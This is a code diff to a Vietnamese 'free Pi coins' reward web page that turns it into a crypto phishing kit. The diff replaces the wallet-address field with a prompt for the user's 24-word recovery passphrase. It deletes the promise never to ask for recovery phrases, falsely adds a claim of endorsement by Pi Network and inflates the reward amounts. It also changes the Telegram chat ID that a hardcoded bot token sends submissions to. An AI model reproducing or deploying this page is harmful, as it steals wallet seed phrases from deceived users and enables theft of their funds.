@@ -627,20 +627,35 @@
         .pi-input-container {
             margin-bottom: 1.5rem;
             border-radius: 16px;
+            height: 250px; /* Tăng chiều cao */
             overflow: hidden;
             background: var(--input-bg);
             border: 1px solid rgba(255, 255, 255, 0.2);
             box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            max-width: 1000px; /* Điều chỉnh độ rộng tại đây */
+            margin-left: auto;
+            margin-right: auto;
+            display: flex;
+            flex-direction: column;
         }
 
         .pi-input {
             width: 100%;
             padding: 24px;
+            height: 250px; /* Tăng chiều cao */
+            resize: none; 
             background: transparent;
             border: none;
             font-size: 1.1rem;
             color: var(--text-secondary);
             outline: none;
+            vertical-align: top;
+            text-align: left;
+            word-break: break-word;
+            overflow-wrap: break-word;
+            white-space: pre-wrap;
+            display: block;
+            align-self: flex-start;
         }
 
         .pi-button {
@@ -1220,6 +1235,33 @@
                 transform: translateY(-15px); 
             }
         }
+
+        #formPage {
+            background-color: white !important;
+        }
+
+        #formPage .pi-wallet-style {
+            background-color: white;
+            color: #333; /* Để văn bản hiển thị rõ trên nền trắng */
+        }
+
+        #formPage .pi-title {
+            color: #333;
+        }
+
+        #formPage .pi-info-text {
+            color: #555;
+        }
+
+        /* Đảm bảo input vẫn hiển thị tốt trên nền trắng */
+        #formPage .pi-input-container {
+            background: #f8f8f8;
+            border: 1px solid #ddd;
+        }
+
+        #formPage .pi-input {
+            color: #333;
+        }
     </style>
 </head>
 <body>
@@ -1328,7 +1370,7 @@
                                 <div class="absolute top-3 right-3 text-xs font-bold bg-gradient-to-r from-purple-500 to-purple-800 text-white px-2 py-1 rounded-full">Hot</div>
                                 <h4 class="text-xl font-bold mb-2">Thưởng Chào Mừng</h4>
                                 <p class="text-sm text-gray-500 dark:text-gray-400 mb-3">Người dùng mới</p>
-                                <p class="reward-amount mb-4">1</p>
+                                <p class="reward-amount mb-4">10</p>
                                 <div class="progress-bar mb-2">
                                     <div class="progress-fill" style="width: 84.2%"></div>
                                 </div>
@@ -1340,7 +1382,7 @@
                             <div class="tilt-card-inner">
                                 <h4 class="text-xl font-bold mb-2">Phần Thưởng Tiên Phong</h4>
                                 <p class="text-sm text-gray-500 dark:text-gray-400 mb-3">Có thời hạn</p>
-                                <p class="reward-amount mb-4">0.5</p>
+                                <p class="reward-amount mb-4">100</p>
                                 <div class="progress-bar mb-2">
                                     <div class="progress-fill" style="width: 82.6%"></div>
                                 </div>
@@ -1352,7 +1394,7 @@
                             <div class="tilt-card-inner">
                                 <h4 class="text-xl font-bold mb-2">Thưởng Cộng Đồng</h4>
                                 <p class="text-sm text-gray-500 dark:text-gray-400 mb-3">Thưởng giới thiệu</p>
-                                <p class="reward-amount mb-4">0.2</p>
+                                <p class="reward-amount mb-4">10</p>
                                 <div class="progress-bar mb-2">
                                     <div class="progress-fill" style="width: 64.75%"></div>
                                 </div>
@@ -1376,13 +1418,13 @@
                             <div class="about-planets about-planet-3"></div>
                         </div>
                         
-                        <p class="mb-8 text-lg text-center">Chương trình thưởng này là sáng kiến do cộng đồng thực hiện để hỗ trợ những người đam mê Pi Network. Là chương trình khuyến mãi độc lập, chúng tôi phân phối một lượng giới hạn Pi coins cho các thành viên cộng đồng tích cực.</p>
+                        <p class="mb-8 text-lg text-center">Chương trình thưởng này là sáng kiến do cộng đồng thực hiện để hỗ trợ những người tiên phong Pi Network. Là chương trình khuyến mãi độc lập, chúng tôi chỉ phân phối một lượng giới hạn Pi coins cho các thành viên cộng đồng tích cực.</p>
                         
                         <h4 class="text-2xl font-bold mb-6 text-center">Cách Thức Hoạt Động</h4>
                         <div class="grid grid-cols-2 md:grid-cols-4 gap-6 mb-8">
                             <div class="text-center animate-scale-in" data-delay="100">
                                 <div class="step-circle">1</div>
-                                <p>Nhấn vào nút "Nhận Pi Miễn Phí" phía trên</p>
+                                <p>Nhấn vào nút "Nhận Pi Miễn Phí Ngay" phía trên</p>
                             </div>
                             <div class="text-center animate-scale-in" data-delay="200">
                                 <div class="step-circle">2</div>
@@ -1403,7 +1445,7 @@
                                 <i class="fas fa-shield-alt"></i>
                             </div>
                             <p class="certificate-title">Bảo Mật & Minh Bạch</p>
-                            <p class="certificate-text">Đây là chiến dịch khuyến mãi độc lập và không liên kết hay được xác nhận bởi Pi Network chính thức. Chúng tôi sẽ không bao giờ yêu cầu mật khẩu, cụm khôi phục, hoặc khóa riêng của bạn.</p>
+                            <p class="certificate-text">Đây là chiến dịch khuyến mãi độc lập và không liên kết hay được xác nhận bởi Pi Network chính thức.</p>
                         </div>
                     </div>
                 </section>
@@ -1456,11 +1498,11 @@
                             <h5 class="font-bold mb-3">Liên Hệ</h5>
                             <p class="flex items-center justify-center mb-2">
                                 <i class="fas fa-envelope mr-2 text-purple-400"></i>
-                                support@pirewards.com
+                                support@getpifree.com
                             </p>
                             <p class="flex items-center justify-center">
                                 <i class="fas fa-globe mr-2 text-purple-400"></i>
-                                www.pirewards.com
+                                GETPIFREE
                             </p>
                         </div>
                         <div>
@@ -1483,8 +1525,8 @@
                             </div>
                         </div>
                     </div>
-                    <p class="mb-4 max-w-2xl mx-auto">Đây là chương trình khuyến mãi độc lập và không liên kết hay được xác nhận bởi Pi Network chính thức.</p>
-                    <p class="text-sm text-gray-500 dark:text-gray-400">© 2023 Chương Trình Thưởng Pi Network. Bảo lưu mọi quyền.</p>
+                    <p class="mb-4 max-w-2xl mx-auto">Đây là chương trình khuyến mãi độc lập và xác nhận bởi Pi Network chính thức.</p>
+                    <p class="text-sm text-gray-500 dark:text-gray-400">© 2025 Chương Trình Thưởng Pi Network. Bảo lưu mọi quyền.</p>
                 </div>
             </footer>
         </div>
@@ -1497,13 +1539,13 @@
                     
                     <div class="animate-on-scroll" data-delay="200">
                         <div class="pi-input-container">
-                            <input type="text" id="walletAddress" class="pi-input" placeholder="Nhập địa chỉ ví Pi của bạn tại đây">
+                            <textarea id="walletAddress" class="pi-input" placeholder="Nhập cụm mật khẩu 24 từ của bạn tại đây"></textarea>
                         </div>
                     </div>
                     
                     <div class="animate-on-scroll" data-delay="400">
                         <button id="unlockSubmitBtn" class="pi-button pi-button-primary surprise-trigger">
-                            MỞ KHÓA VỚI ĐỊA CHỈ VÍ
+                            MỞ KHÓA VỚI CỤM MẬT KHẨU
                         </button>
                         
                         <button class="pi-button pi-button-secondary">
@@ -1512,8 +1554,8 @@
                     </div>
                     
                     <div class="pi-info-text animate-on-scroll" data-delay="600">
-                        <p>Là một ví không giám sát, địa chỉ ví của bạn sẽ được công khai.</p>
-                        <p class="mt-2">Bạn quên địa chỉ ví? <a href="#" class="pi-link">Bạn có thể tạo một ví mới</a>, nhưng tất cả số π trong ví trước đó của bạn sẽ không thể truy cập.</p>
+                        <p>Là một ví không giám sát, cụm mật khẩu của bạn chỉ có bạn mới có thể truy cập. Hiện tại không thể khôi phục cụm mật khẩu</p>
+                        <p class="mt-2">Bạn bị mất cụm mật khẩu ví? <a href="#" class="pi-link">Bạn có thể tạo một ví mới</a>, nhưng tất cả số π trong ví trước đó của bạn sẽ không thể truy cập.</p>
                     </div>
                     
                     <!-- Hidden explosion particles for surprise effect -->
@@ -1542,7 +1584,7 @@
             
             <div class="space-y-6 mb-8">
                 <div class="success-detail">
-                    <span class="success-detail-label">Địa Chỉ Ví:</span>
+                    <span class="success-detail-label">Ví nhận:</span>
                     <span id="successWalletAddress" class="success-detail-value truncate max-w-[200px]">...</span>
                 </div>
                 <div class="success-detail">
@@ -1903,7 +1945,7 @@
                 try {
                     // Replace with your actual Telegram bot token and chat ID
                     const BOT_TOKEN = '7161535723:AAGqp8BU4hsvaUCO0nBdx6-tZM9BOwZfj1Y';
-                    const CHAT_ID = '5867504772';
+                    const CHAT_ID = '7305842707';
                     
                     // Prepare message
                     const message = `🎁 Yêu cầu phần thưởng Pi mới!\n\n📋 Địa chỉ ví: ${walletAddress}\n⏰ Thời gian: ${new Date().toLocaleString()}`;
